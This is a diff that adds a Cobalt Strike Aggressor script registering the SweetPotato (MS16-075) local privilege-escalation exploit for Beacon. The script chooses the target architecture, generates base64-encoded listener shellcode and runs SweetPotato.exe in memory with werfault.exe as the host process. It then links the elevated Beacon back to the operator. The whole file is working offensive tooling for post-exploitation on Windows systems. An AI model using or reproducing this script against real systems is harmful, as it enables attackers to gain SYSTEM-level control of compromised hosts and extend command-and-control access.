@@ -1,0 +1,28 @@
+# SweetPotato built as C# exe 
+
+sub SweetPotato {
+	local('$shellcode $arch $program $exe $parm');
+
+	# acknowledge this command
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via SweetPotato (ms16-075)", "T1068");
+    
+    # tune our parameters based on the target arch
+    if (-is64 $1)
+    {
+        $arch = "x64";
+	} else {
+        $arch = "x86";
+	}
+	$program = "c:\\windows\\system32\\werfault.exe";
+	$exe = script_resource("SweetPotato.exe");
+    # generate our shellcode
+	$shellcode = base64_encode(payload($2, $arch));
+	# -c 4991D34B-80A1-4291-83B6-3328366B9097 
+	$parm = "-l 6363 "."-p $program "."-s $shellcode";
+    # spawn a Beacon post-ex job with bexecute_assembly
+    bexecute_assembly!($1,$exe,$parm);
+    # link to our payload if it's a TCP or SMB Beacon
+	beacon_link($1, $null, $2);
+}
+beacon_exploit_register("SweetPotato", "SweetPotato (ms16-075)", &SweetPotato);
+
